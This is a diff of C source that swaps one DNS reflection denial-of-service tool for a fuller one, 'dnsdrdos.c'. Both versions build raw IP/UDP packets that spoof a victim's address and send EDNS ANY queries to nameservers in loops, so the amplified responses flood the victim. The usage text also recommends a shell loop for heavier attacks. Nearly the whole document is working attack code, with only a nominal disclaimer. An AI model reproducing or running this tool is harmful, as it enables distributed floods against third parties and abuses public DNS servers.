@@ -1,44 +1,60 @@
-#pragma pack(1)
+
+    
+/*******************************************************************************
+ * dnsdrdos.c - DNS distributed reflection DoS                                 *
+ *                                                                             *
+ * DATE:                                                                       *
+ * - xx/xx/2010                                                                *
+ *                                                                             *
+ * DESCRIPTION:                                                                *
+ * - Proof of concept code for distributed DNS reflection DoS. All you need is *
+ *   only a list of authorative nameservers. This technique is well-known and  *
+ *   can be used against much more protocols.                                  *
+ *                                                                             *
+ * COMPILE:                                                                    *
+ * - gcc -o dnsdrdos dnsdrdos.c -Wall -ansi                                    *
+ *                                                                             *
+ * NOTES:                                                                      *
+ * - quick'n'dirty c0de                                                        *
+ * - Only for testing purposes. I am not responsible for misusage.             *
+ *                                                                             *
+ * AUTHOR:                                                                     *
+ * - noptrix (http://www.noptrix.net/ - http://www.majorsecurity.net)          *
+ ******************************************************************************/
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <unistd.h>
+#include <getopt.h>
 #include <sys/socket.h>
+#include <arpa/inet.h>
+#include <netinet/in.h>
 #include <netinet/ip.h>
 #include <netinet/udp.h>
-#include <arpa/inet.h>
-#include <unistd.h>
-#include <sys/time.h>
-#include <time.h>
-
-typedef struct iphdr ip_header;
-typedef struct udphdr udp_header;
-
-typedef struct
-{
-    u_int32_t saddr;
-    u_int32_t daddr;
-    u_int8_t filler;
-    u_int8_t protocol;
-    u_int16_t len;
-}ps_header;
 
 
-typedef struct
-{
-    unsigned short dnshdr_id;
-    unsigned short dnshdr_flags;
-    unsigned short dnshdr_qcount; 
-    unsigned short dnshdr_ans; 
-    unsigned short dnshdr_auth; 
-    unsigned short dnshdr_add;
-}dns_header;
+/* global settings */
+#define VERSION             "v0.1"
+#define ATOI(x)             strtol(x, (char **) NULL, 10)
+#define MAX_LEN             128     /* max line for dns server list */
 
 
-typedef struct
-{
-    unsigned short dns_type;
-    unsigned short dns_class;
-}quest_type;
+/* default settings */
+#define DEFAULT_SPOOF_ADDR  "127.0.0.1"
+#define DEFAULT_DOMAIN      "google.com."
+#define DEFAULT_DNS_PORT    53
+#define DEFAULT_LOOPS       10000
+
+
+/* error handling */
+#define __EXIT_FAILURE      exit(EXIT_FAILURE);
+#define __EXIT_SUCCESS      exit(EXIT_SUCCESS);
+
+#define __ERR_GEN do { fprintf(stderr,"[-] ERROR: " __FILE__ ":%u -> ",\
+                               __LINE__); fflush(stderr); perror(""); \
+    __EXIT_FAILURE } while (0)
+
 
 typedef struct{
     unsigned char name;
@@ -50,171 +66,616 @@ typedef struct{
     unsigned short datalength;
 }dns_opt;
 
-void error(char *str)
+/* dns header */
+typedef struct {
+    unsigned short id;
+    unsigned char rd :1;
+    unsigned char tc :1;
+    unsigned char aa :1;
+    unsigned char opcode :4;
+    unsigned char qr :1;
+    unsigned char rcode :4;
+    unsigned char cd :1;
+    unsigned char ad :1;
+    unsigned char z :1;
+    unsigned char ra :1;
+    unsigned short q_count;
+    unsigned short ans_count;
+    unsigned short auth_count;
+    unsigned short add_count;
+} dnsheader_t;
+
+
+/* dns query */
+typedef struct {
+    unsigned short qtype;
+    unsigned short qclass;
+} query_t;
+
+
+/* our job */
+typedef struct {
+    char *file;
+    char **addrs;
+    uint16_t port;
+    unsigned int num_addrs;
+    char *spoof_addr;
+    char *domain;
+    unsigned int loops;
+} job_t;
+
+
+/* our bomb */
+typedef struct {
+    int one;
+    int sock;
+    char *packet;
+    struct sockaddr_in target;
+    struct iphdr *ip;
+    struct udphdr *udp;
+    dnsheader_t *dns;
+    query_t *query;
+    dns_opt *opt;
+} bomb_t;
+
+
+/* just wrapper */
+void *xmalloc(size_t);
+void *xmemset(void *, int, size_t);
+int xsocket(int, int, int);
+void xclose(int);
+void xsendto(int, const void *, size_t, int, const struct sockaddr *,
+             socklen_t);
+
+/* prog stuff */
+void banner();
+void usage();
+void check_argc(int);
+void check_args();
+FILE *open_file(char *);
+unsigned int count_lines(char *);
+char **read_lines(char *, unsigned int);
+void check_uid();
+
+/* net stuff */
+bomb_t *create_rawsock(bomb_t *);
+bomb_t *stfu_kernel(bomb_t *);
+unsigned short checksum(unsigned short *, int);
+bomb_t *build_ip_header(bomb_t *, job_t *, int);
+bomb_t *build_udp_header(bomb_t *, job_t *);
+bomb_t *build_dns_request(bomb_t *, job_t *);
+void dns_name_format(char *, char *);
+bomb_t *build_packet(bomb_t *, job_t *, int);
+bomb_t *fill_sockaddr(bomb_t *);
+void run_dnsdrdos(job_t *, int);
+void free_dnsdrdos(job_t *);
+
+
+/* wrapper for malloc() */
+void *xmalloc(size_t size)
 {
-    printf("%s\n",str);
+   void *buff;
+
+
+   if ((buff = malloc(size)) == NULL) {
+       __ERR_GEN;
+   }
+
+   return buff;
 }
 
 
-unsigned short csum(unsigned short *ptr,int nbytes) 
+/* wrapper for memset() */
+void *xmemset(void *s, int c, size_t n)
 {
-    register long sum;
-    unsigned short oddbyte;
-    register short answer;
+   if (!(s = memset(s, c, n))) {
+       __ERR_GEN;
+   }
 
-    sum=0;
-    while(nbytes>1) {
-        sum+=*ptr++;
-        nbytes-=2;
-    }
-    if(nbytes==1) {
-        oddbyte=0;
-        *((unsigned char *)&oddbyte)=*(unsigned char *)ptr;
-        sum+=oddbyte;
+   return s;
+}
+
+
+/* wrapper for socket() */
+int xsocket(int domain, int type, int protocol)
+{
+    int sockfd = 0;
+
+
+    sockfd = socket(domain, type, protocol);
+
+    if (sockfd == -1) {
+        __ERR_GEN;
     }
 
-    sum = (sum>>16)+(sum & 0xffff);
-    sum = sum + (sum>>16);
-    answer=(short)~sum;
+    return sockfd;
+}
+
+
+/* wrapper for setsockopt() */
+void xsetsockopt(int sockfd, int level, int optname, const void *optval,
+                 socklen_t optlen)
+{
+    int x = 0;
+
+
+    x = setsockopt(sockfd, level, optname, optval, optlen);
+
+    if (x != 0) {
+        __ERR_GEN;
+    }
+
+    return;
+}
+
+
+/* wrapper for close() */
+void xclose(int fd)
+{
+    int x = 0;
+
+
+    x = close(fd);
+
+    if (x != 0) {
+        __ERR_GEN;
+    }
+
+    return;
+}
+
+
+/* wrapper for sendto() */
+void xsendto(int sockfd, const void *buf, size_t len, int flags,
+             const struct sockaddr *dest_addr, socklen_t addrlen)
+{
+    int x = 0;
+
     
-    return(answer);
+    x = sendto(sockfd, buf, len, flags, dest_addr, addrlen);
+
+    if (x == -1) {
+        __ERR_GEN;
+    }
+
+    return;
 }
 
 
-void urlFormatTransform(unsigned char *after, unsigned char *before){
-    strcat((char*)before,".");
-    int i, j = 0; 
-    for(i = 0 ; i < strlen((char*)before);i++) 
-    {
-        if(before[i]=='.'){
-            *after++ = i - j;
-            for(;j<i;j++) *after++ = before[j];
+/* just our leet banner */
+void banner()
+{
+    printf("-----------------------------------------------\
+    \ndnsdrdos - by noptrix - http://www.noptrix.net/\
+    \n-----------------------------------------------\n");
+
+    return;
+}
+
+
+/* usage and help */
+void usage()
+{
+    printf("usage:\n\n\
+  dnsdrdos -f <file> [options] | [misc]\n\
+    \ntarget:\n\n\
+  -f <file>       - list of dns servers (only one ip-address per line!)\n\
+  -s <addr>       - ip-address to spoof (default: 127.0.0.1)\n\
+  -d <domain>     - which domain should be requested?\n\
+                    (default: \"google.com.\")\n\
+  -l <num>        - how many loops through list? (default: 10000)\n\nmisc:\n\n\
+  -V              - show version\n\
+  -H              - show help and usage\n\nexample:\n\n\
+  ./dnsdrdos -f nameserver.lst -s 192.168.2.211 -d google.com. -l 10000\n\n\
+  or better:\n\n\
+  $ for i in `seq 1 1000`; do ./dnsdrdos -f nameserver.lst \\\n\
+  -s 192.168.2.211 -d $i -l 10000; done\n\n\
+  This is better, because we ask dynamically for any domain names.\n\
+  Even if the domainname is not given, 'we' still would recieve DNS\n\
+  answers.\n");
+
+    __EXIT_SUCCESS;
+
+    return;
+}
+
+
+/* check first usage */
+void check_argc(int argc)
+{
+    if (argc < 2) {
+        fprintf(stderr, "[-] ERROR: use -H for help and usage\n");
+        __EXIT_FAILURE;
+    }
+
+    return;
+}
+
+
+/* check if host and port are selected */
+void check_args(job_t *job)
+{
+    if (!(job->file) || !(job->spoof_addr) || (job->loops <= 0)) {
+        fprintf(stderr, "[-] ERROR: you fucked up, mount /dev/brain\n");
+        __EXIT_FAILURE
+    }
+
+    return;
+}
+
+
+/* open file and return file pointer */
+FILE *open_file(char *file)
+{
+    FILE *fp = NULL;
+
+
+    if (!(fp = fopen(file, "r"))) {
+        __ERR_GEN;
+    }
+
+    return fp;
+}
+
+
+/* count lines -> wc -l :) */
+unsigned int count_lines(char *file)
+{
+    FILE *fp = NULL;
+    int c = 0;
+    unsigned int lines = 0;
+
+
+    fp = open_file(file);
+
+    while ((c = fgetc(fp)) != EOF) {
+        if ((c == '\n') || (c == 0x00)) {
+            lines++;
+        }
+    }
+    fclose(fp);
+
+    return lines;
+}
+
+
+/* read in ip-addresses line by line */
+char **read_lines(char *file, unsigned int lines)
+{
+    FILE *fp = NULL;
+    char *buffer = NULL;
+    char **words = NULL;
+    int i = 0;
+
+
+    fp = open_file(file);
+
+    buffer = (char *) xmalloc(MAX_LEN);
+    words = (char **) xmalloc(lines * sizeof(char *));
+    buffer = xmemset(buffer, 0x00, MAX_LEN);
+
+    while (fgets(buffer, MAX_LEN, fp) != NULL) {
+        if ((buffer[strlen(buffer) - 1] == '\n') ||
+            (buffer[strlen(buffer) - 1] == '\r')) {
+            buffer[strlen(buffer) - 1] = 0x00;
+            words[i] = (char *) xmalloc(MAX_LEN - 1);
+            words[i] = xmemset(words[i], 0x00, MAX_LEN - 1);
+            strncpy(words[i], buffer, MAX_LEN - 1);
+            buffer = xmemset(buffer, 0x00, MAX_LEN - 1);
+            i++;
+        } else {
+            continue;
+        }
+    }
+    free(buffer);
+    fclose(fp);
+
+    return words;
+}
+
+
+/* set default values */
+job_t *set_defaults()
+{
+    job_t *job;
+
+
+    job = (job_t *) xmalloc(sizeof(job_t));
+    job = xmemset(job, 0x00, sizeof(job_t));
+
+    job->port = (uint16_t) DEFAULT_DNS_PORT;
+    job->spoof_addr = DEFAULT_SPOOF_ADDR;
+    job->domain = DEFAULT_DOMAIN;
+    job->loops = (unsigned int) DEFAULT_LOOPS;
+
+    return job;
+}
+
+
+/* check for uid */
+void check_uid()
+{
+    if (getuid() != 0) {
+        fprintf(stderr, "[-] ERROR: you need to be r00t\n");
+        __EXIT_FAILURE;
+    }
+
+    return;
+}
+
+
+/* create raw socket */
+bomb_t *create_rawsock(bomb_t *bomb)
+{
+    bomb->sock = xsocket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+
+    return bomb;
+}
+
+
+/* say STFU to kernel - we set our own headers */
+bomb_t *stfu_kernel(bomb_t *bomb)
+{
+    bomb->one = 1;
+
+    xsetsockopt(bomb->sock, IPPROTO_IP, IP_HDRINCL, &bomb->one, 
+                sizeof(bomb->one));
+
+    return bomb;
+}
+
+
+/* checksum for IP and UDP header */
+unsigned short checksum(unsigned short *addr, int len)
+{
+    u_int32_t cksum  = 0;
+    
+    
+    while(len > 0) {
+        cksum += *addr++;
+        len -= 2;
+    }
+
+    if(len == 0) {
+        cksum += *(unsigned char *) addr;
+    }
+    
+    cksum = (cksum >> 16) + (cksum & 0xffff);
+    cksum = cksum + (cksum >> 16);
+
+    return (~cksum);
+}
+
+
+/* build and fill in ip header */
+bomb_t *build_ip_header(bomb_t *bomb, job_t *job, int c)
+{
+    bomb->ip = (struct iphdr *) bomb->packet;
+
+    bomb->ip->version = 4;
+    bomb->ip->ihl = 5;
+    bomb->ip->id = htonl(rand());
+    bomb->ip->saddr = inet_addr(job->spoof_addr);
+    bomb->ip->daddr = inet_addr(job->addrs[c]);
+    bomb->ip->ttl = 64;
+    bomb->ip->tos = 0;
+    bomb->ip->frag_off = 0;
+    bomb->ip->protocol = IPPROTO_UDP;
+    bomb->ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) +
+                              sizeof(dnsheader_t) + sizeof(query_t) + sizeof(dns_opt)
+                             + strlen(job->domain) + 1);
+    bomb->ip->check = checksum((unsigned short *) bomb->ip,
+                               sizeof(struct iphdr));
+
+    return bomb;
+}
+
+
+/* build and fill in udp header */
+bomb_t *build_udp_header(bomb_t *bomb, job_t *job)
+{
+    bomb->udp = (struct udphdr *) (bomb->packet + sizeof(struct iphdr));
+
+    bomb->udp->source = htons(rand());
+    bomb->udp->dest = htons(DEFAULT_DNS_PORT);
+    bomb->udp->len = htons(sizeof(struct udphdr) + sizeof(dnsheader_t) + sizeof(dns_opt) + sizeof(query_t) + strlen(job->domain) + 1);
+    bomb->udp->check = 0;
+
+    return bomb;
+}
+
+
+/* convert to dns format */
+void dns_name_format(char *qname, char *host)
+{
+    int i = 0;
+    int j = 0;
+
+    
+    for (i = 0 ; i < (int) strlen(host) ; i++) {
+        if (host[i] == '.') {
+            *qname++ = i-j;
+            for (; j < i; j++) {
+                *qname++ = host[j];
+            }
             j++;
         }
     }
-    *after++ = 0x00;
-    return;
+
+    *qname++ = 0x00;
 }
-void reflectionAttack(char *victim_ip, int victim_port, char *dns_server, int dns_port, unsigned char *query_url)
+
+
+/* build and fill in dns request */
+bomb_t *build_dns_request(bomb_t *bomb, job_t *job)
 {
-    unsigned char dns_rcrd[32];
-    unsigned char *dns_url1;
-    dns_url1 = malloc(32);
-    strcpy(dns_rcrd, query_url);
-    urlFormatTransform(dns_url1 , dns_rcrd);
+    char *qname = NULL;
 
-    int buflen = sizeof(dns_header) + (strlen(dns_url1)+1)+ sizeof(quest_type)+sizeof(dns_opt);
-    unsigned char dns_data[buflen];
-    
-    dns_header *dns = (dns_header *)&dns_data;
-    dns->dnshdr_id = (unsigned short) htons(getpid());
-    dns->dnshdr_flags = htons(0x0100);
-    dns->dnshdr_qcount = htons(1);
-    dns->dnshdr_ans = 0;
-    dns->dnshdr_auth = 0;
-    dns->dnshdr_add = htons(1);
-    
-    unsigned char *dns_url;
-    dns_url = (unsigned char *)&dns_data[sizeof(dns_header)];
-    urlFormatTransform(dns_url , dns_rcrd);
-    
-    quest_type *q;
-    q = (quest_type *)&dns_data[sizeof(dns_header) + (strlen(dns_url)+1)];
-    q->dns_type = htons(0x00ff);
-    q->dns_class = htons(0x1);
-    
-    dns_opt * dopt = (dns_opt *)&dns_data[sizeof(dns_header) + (strlen(dns_url)+1)+ sizeof(quest_type)];
-    dopt->name = 0;
-    dopt->type = htons(41);
-    dopt->udplength = htons(4096);
-    dopt->rcode = 0;
-    dopt->ednsversion = 0;
-    dopt->Z = htons(0x8000);
-    dopt->datalength = 0;
+
+    bomb->dns = (dnsheader_t *) (bomb->packet + sizeof(struct iphdr) + 
+                           sizeof(struct udphdr));
+
+    bomb->dns->id = (unsigned short) htons(getpid());
+    bomb->dns->qr = 0;
+    bomb->dns->opcode = 0;
+    bomb->dns->aa = 0;
+    bomb->dns->tc = 0;
+    bomb->dns->rd = 1;
+    bomb->dns->ra = 0;
+    bomb->dns->z = 0;
+    bomb->dns->ad = 0;
+    bomb->dns->cd = 0;
+    bomb->dns->rcode = 0;
+    bomb->dns->q_count = htons(1);
+    bomb->dns->ans_count = 0;
+    bomb->dns->auth_count = 0;
+    bomb->dns->add_count = htons(1);
+
+    qname = &bomb->packet[sizeof(struct iphdr) + sizeof(struct udphdr) + 
+        sizeof(dnsheader_t)];
+    job->domain = "www.google.com.";
+    dns_name_format(qname, job->domain);
+
+    bomb->query = (query_t *) &bomb->packet[sizeof(struct iphdr) + 
+        sizeof(struct udphdr) + sizeof(dnsheader_t) + (strlen(qname) + 1)];
+
+    bomb->query->qtype = htons(255);
+    bomb->query->qclass = htons(1);
+    bomb->opt = (dns_opt*)(bomb->packet + sizeof(struct iphdr) + 
+                           sizeof(struct udphdr) + sizeof(dnsheader_t) + (strlen(qname)) + sizeof(query_t));
+    bomb->opt->name = 0;
+    /*printf("%d\n",bomb->opt->type);*/
+    bomb->opt->type  =htons(41) ;
+    /*printf("%d\n",bomb->opt->type);*/
+    bomb->opt->udplength =htons(4096);
+    bomb->opt->rcode = 0;
+    bomb->opt->ednsversion = 0;
+    bomb->opt->Z = htons(0x8000);
+    bomb->opt->datalength = 0;
+    return bomb;
+}
+
+
+/* build packet */
+bomb_t *build_packet(bomb_t *bomb, job_t *job, int c)
+{
+    bomb->packet = (char *) xmalloc(4096);
+    bomb->packet = xmemset(bomb->packet, 0x00, 4096);
+
+    bomb = build_ip_header(bomb, job, c);
+    bomb = build_udp_header(bomb, job);
+    bomb = build_dns_request(bomb, job);
+
+    return bomb;
+}
+
+
+/* fill in sockaddr_in {} */
+bomb_t *fill_sockaddr(bomb_t *bomb)
+{
+    bomb->target.sin_family = AF_INET;
+    bomb->target.sin_port = bomb->udp->dest;
+    bomb->target.sin_addr.s_addr = bomb->ip->daddr;
+
+    return bomb;
+}
+
+
+/* start action! */
+void run_dnsdrdos(job_t *job, int c)
+{
+    bomb_t *bomb = NULL;
 
     
-    char datagram[4096], *data, *psgram;
-    memset(datagram, 0, 4096);
-    
-    data = datagram + sizeof(ip_header) + sizeof(udp_header);
-    memcpy(data, &dns_data, sizeof(dns_header) + (strlen(dns_url)+1) + sizeof(quest_type) +sizeof(dns_opt)+1);
-    
-    struct sockaddr_in sin;
-    sin.sin_family = AF_INET;
-    sin.sin_port = htons(dns_port);
-    sin.sin_addr.s_addr = inet_addr(dns_server);
-    
-    ip_header *ip = (ip_header *)datagram;
-    ip->version = 4;
-    ip->ihl = 5;
-    ip->tos = 0;
-    ip->tot_len = sizeof(ip_header) + sizeof(udp_header) + sizeof(dns_header) + (strlen(dns_url)+1) + sizeof(quest_type)+sizeof(dns_opt);
-    ip->id = htonl(getpid());
-    ip->frag_off = 0;
-    ip->ttl = 64;
-    ip->protocol = IPPROTO_UDP;
-    ip->check = 0;
-    ip->saddr = inet_addr(victim_ip);
-    ip->daddr = sin.sin_addr.s_addr;
-    ip->check = csum((unsigned short *)datagram, ip->tot_len);
-    
-    udp_header *udp = (udp_header *)(datagram + sizeof(ip_header));
-    udp->source = htons(victim_port);
-    udp->dest = htons(dns_port);
-    udp->len = htons(8+sizeof(dns_header)+(strlen(dns_url)+1)+sizeof(quest_type)+sizeof(dns_opt));
-    udp->check = 0;
-    
-    
-    ps_header pshdr;
-    pshdr.saddr = inet_addr(victim_ip);
-    pshdr.daddr = sin.sin_addr.s_addr;
-    pshdr.filler = 0;
-    pshdr.protocol = IPPROTO_UDP;
-    pshdr.len = htons(sizeof(udp_header) + sizeof(dns_header) + (strlen(dns_url)+1) + sizeof(quest_type)+sizeof(dns_opt));
+    bomb = (bomb_t *) xmalloc(sizeof(bomb_t));
+    bomb = xmemset(bomb, 0x00, sizeof(bomb_t));
 
-    int pssize = sizeof(ps_header) + sizeof(udp_header) + sizeof(dns_header) + (strlen(dns_url)+1) + sizeof(quest_type)+sizeof(dns_opt);
-    psgram = malloc(pssize);
-    
-    memcpy(psgram, (char *)&pshdr, sizeof(ps_header));
-    memcpy(psgram + sizeof(ps_header), udp, sizeof(udp_header) + sizeof(dns_header) + (strlen(dns_url)+1) + sizeof(quest_type)+sizeof(dns_opt));
-        
-    udp->check = csum((unsigned short *)psgram, pssize);
-    
-    
-    int sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-    if(sd==-1) error("Could not create socket.");
-    else sendto(sd, datagram, ip->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
-    
-    free(psgram);
-    close(sd);
-    
+    bomb = create_rawsock(bomb);
+    bomb = stfu_kernel(bomb);
+    bomb = build_packet(bomb, job, c);
+    bomb = fill_sockaddr(bomb);
+
+    xsendto(bomb->sock, bomb->packet, sizeof(struct iphdr) + 
+            sizeof(struct udphdr) + sizeof(dnsheader_t) + sizeof(query_t) + sizeof(dns_opt)+ strlen(job->domain) + 1, 0, (struct sockaddr *) &bomb->target, 
+            sizeof(bomb->target));
+
+    xclose(bomb->sock);
+    free(bomb->packet);
+    free(bomb);
+
     return;
 }
-void usage(char *str);
 
+
+/* free dnsdrdos \o/ */
+void free_dnsdrdos(job_t *job)
+{
+    int i = 0;
+
+    for (i = 0; i < job->num_addrs; i++) {
+        free(job->addrs[i]);
+    }
+
+    free(job);
+
+    return;
+}
+
+
+/* here we go */
 int main(int argc, char **argv)
-{   
+{
+    int c = 0;
+    unsigned int i = 0;
+    job_t *job;
+
+
+    banner();           /* banner output is important! */
+    check_argc(argc);
+    job = set_defaults();
+
+    while ((c = getopt(argc, argv, "f:s:d:l:VH")) != -1) {
+        switch (c) {
+         case 'f':
+             job->file = optarg;
+             break;
+         case 's':
+             job->spoof_addr = optarg;
+             break;
+         case 'd':
+             job->domain = optarg;
+             break;
+         case 'l':
+             job->loops = (unsigned int) ATOI(optarg);
+             break;
+         case 'V':
+             puts(VERSION);
+             __EXIT_SUCCESS;
+             break;
+         case 'H':
+             usage();
+             break;
+             __EXIT_SUCCESS;
+        }
+    }
+
+    check_args(job);
     
-    if(getuid()!=0)
-        error("You must be running as root!");
-    if(argc<3)
-        usage(argv[0]);
+    job->num_addrs = count_lines(job->file);
+    job->addrs = read_lines(job->file, job->num_addrs);
     
+    check_uid();
     
-    char *victim_ip = argv[1];
-    int victim_port = atoi(argv[2]);
-    char * dns_server = argv[3];
-    int dns_port = 7;
+    for (i = 0; i < job->loops; i++) {
+        for (c = 0; c < job->num_addrs; c++) {
+            run_dnsdrdos(job, c);
+        printf("packet %d\n",i);
+        }
+    }
+    printf("\n");
     
-    while(1) {
-        reflectionAttack(victim_ip, victim_port, "8.8.8.8", 7, "ieee.org");
-        sleep(3);
-    }   
+    free_dnsdrdos(job);
+    
     return 0;
 }
 
-void usage(char *str)
-{
-    printf("%s\n target port\n", str);
-    exit(0);
-}
